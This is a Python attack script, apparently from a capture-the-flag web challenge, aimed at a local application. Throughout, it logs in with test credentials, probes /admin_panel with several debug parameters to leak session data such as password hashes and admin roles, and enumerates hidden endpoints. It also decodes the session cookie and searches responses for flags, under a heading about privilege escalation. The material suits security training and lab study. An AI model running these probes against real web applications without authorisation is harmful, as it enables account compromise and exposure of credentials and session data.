import requests
import re
import json
import base64

base_url = "http://127.0.0.1:32831"

print("=" * 80)
print("ANALYZING SESSION STRUCTURE WITH DEBUG PARAMETER")
print("=" * 80)

# First, let's check what happens when we access /admin_panel with debug
session = requests.Session()

# Login first
login_data = {"username": "test", "password": "test"}
login_resp = session.post(f"{base_url}/login", data=login_data)
print(f"[+] Login response status: {login_resp.status_code}")

# Check all cookies
print(f"[+] Session cookies: {dict(session.cookies)}")

# Access admin_panel without debug
admin_normal = session.get(f"{base_url}/admin_panel")
print(f"[+] /admin_panel (normal) status: {admin_normal.status_code}, length: {len(admin_normal.text)}B")

# Access admin_panel with debug parameter
admin_debug = session.get(f"{base_url}/admin_panel?debug=session")
print(f"[+] /admin_panel?debug=session status: {admin_debug.status_code}, length: {len(admin_debug.text)}B")

# Let's try to extract session data from the debug response
# Look for any comment that might contain session data
all_comments = re.findall(r'<!--(.*?)-->', admin_debug.text, re.DOTALL)
print(f"\n[+] Found {len(all_comments)} HTML comments in debug response")

for i, comment in enumerate(all_comments):
    comment = comment.strip()
    if comment:
        print(f"\n[+] Comment {i+1} (first 200 chars):")
        print(comment[:200])
        
        # Look for username, password_hash, session_id, user_id patterns
        session_fields = ['username', 'password_hash', 'session_id', 'user_id', 'role', 'is_admin']
        found = []
        for field in session_fields:
            if field in comment.lower() or field in comment:
                found.append(field)
        
        if found:
            print(f"[+] Found session-related fields: {', '.join(found)}")
            
        # Try to parse as JSON if it looks like structured data
        if '{' in comment and '}' in comment:
            print(f"[+] Detected potential JSON structure!")
            # Extract JSON-like content
            json_match = re.search(r'\{[^}]*username[^}]*\}', comment, re.DOTALL | re.IGNORECASE)
            if json_match:
                print(f"[+] JSON-like structure found:")
                print(json_match.group())
                try:
                    data = json.loads(json_match.group())
                    print(f"[+] Successfully parsed session data:")
                    for k, v in data.items():
                        print(f"  - {k}: {v}")
                except:
                    print(f"[-] Could not parse as valid JSON")

# Try adding debug parameter in different ways
print("\n" + "=" * 80)
print("TESTING ALTERNATIVE DEBUG PARAMETER FORMATS")
print("=" * 80)

debug_variations = [
    "?debug=session",
    "?debug=true",
    "?debug=1",
    "?debug=admin",
    "?debug=role"
]

for variation in debug_variations:
    resp = session.get(f"{base_url}/admin_panel{variation}")
    print(f"[+] {variation} - Status: {resp.status_code}, Length: {len(resp.text)}B")
    
    # Quick check for session data
    comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
    for comment in comments:
        if any(field in comment.lower() for field in ['username', 'session_id', 'user_id']):
            print(f"  [+] Found session data with {variation}")

# Try to find hidden endpoints via debug
print("\n" + "=" * 80)
print("EXTRACTING HIDDEN ENDPOINTS VIA DEBUG")
print("=" * 80)

# Check the HTML for any interesting links or forms
links = re.findall(r'href=["\']([^"\']+)["\']', admin_debug.text)
forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', admin_debug.text)

unique_links = list(set(links + forms))
print(f"[+] Found {len(unique_links)} unique URLs/forms in debug response")

for link in unique_links:
    if link.startswith('http'):
        continue
    if link.startswith('javascript'):
        continue
    if not link.startswith('/'):
        link = '/' + link
        
    if 'static' not in link:  # Skip static files
        print(f"[+] Testing hidden endpoint: {link}")
        
        # Test without debug
        normal_resp = session.get(f"{base_url}{link}")
        print(f"  [-] Normal status: {normal_resp.status_code}")
        
        # Test with debug
        debug_resp = session.get(f"{base_url}{link}?debug=session")
        print(f"  [-] Debug status: {debug_resp.status_code}")

print("\n" + "=" * 80)
print("SEARCHING FOR ALL FLAGS IN DEBUG RESPONSE")
print("=" * 80)

# Comprehensive flag search in debug response
flags = re.findall(r'FLAG\{[^}]+\}', admin_debug.text)
if flags:
    print(f"[+] FLAG(S) FOUND in debug response: {flags}")
else:
    print("[-] No FLAG{} pattern found in debug response")

# Check in comments specifically
for i, comment in enumerate(all_comments):
    flags = re.findall(r'FLAG\{[^}]+\}', comment)
    if flags:
        print(f"[+] FLAG(S) FOUND in comment {i+1}: {flags}")
        print(f"[+] Full comment context:")
        print(comment)

# Search for any base64 encoded data that might contain flag
def check_for_encoded_flags(text):
    # Look for base64 strings
    b64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
    candidates = re.findall(b64_pattern, text)
    
    for candidate in candidates[:10]:  # Check first 10 candidates
        try:
            decoded = base64.b64decode(candidate).decode('utf-8', errors='ignore')
            flags = re.findall(r'FLAG\{[^}]+\}', decoded)
            if flags:
                print(f"[+] FLAG FOUND in base64 data: {flags[0]}")
                print(f"[+] Original base64: {candidate}")
        except:
            pass

check_for_encoded_flags(admin_debug.text)

print("\n" + "=" * 80)
print("TESTING SESSION MANIPULATION FOR PRIVILEGE ESCALATION")
print("=" * 80)

# Based on session structure, try to manipulate session manually
# If session is in cookie, try to modify it
if session.cookies:
    print(f"[+] Current session cookies: {dict(session.cookies)}")
    
    # Try to decode session data if it's base64 or similar
    session_value = session.cookies.get('session')
    if session_value:
        print(f"[+] Session value: {session_value}")
        
        # Try different decodings
        try:
            # Try URL-safe base64
            decoded = base64.urlsafe_b64decode(session_value + '=' * (4 - len(session_value) % 4))
            print(f"[+] Decoded session (first 100 chars): {decoded[:100]}")
            
            flags = re.findall(r'FLAG\{[^}]+\}', decoded.decode('utf-8', errors='ignore'))
            if flags:
                print(f"[+] FLAG FOUND in session data: {flags[0]}")
        except Exception as e:
            print(f"[-] Could not decode session: {e}")

print("\n" + "=" * 80)
print("CROSS-REFERENCE TESTING")
print("=" * 80)

# Test if admin_panel shows different content with different parameters
# Try to force session data exposure
test_params = [
    {"debug": "session"},
    {"debug": "session", "expose": "all"},
    {"debug": "session", "format": "json"}
]

for params in test_params:
    resp = session.get(f"{base_url}/admin_panel", params=params)
    print(f"[+] Params {params} - Status: {resp.status_code}, Length: {len(resp.text)}B")
    
    # Look for session structure
    comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
    for comment in comments:
        if 'username' in comment or 'user_id' in comment:
            print(f"  [+] Session data found with params {params}")
            print(f"  [+] Session excerpt: {comment[:200]}")

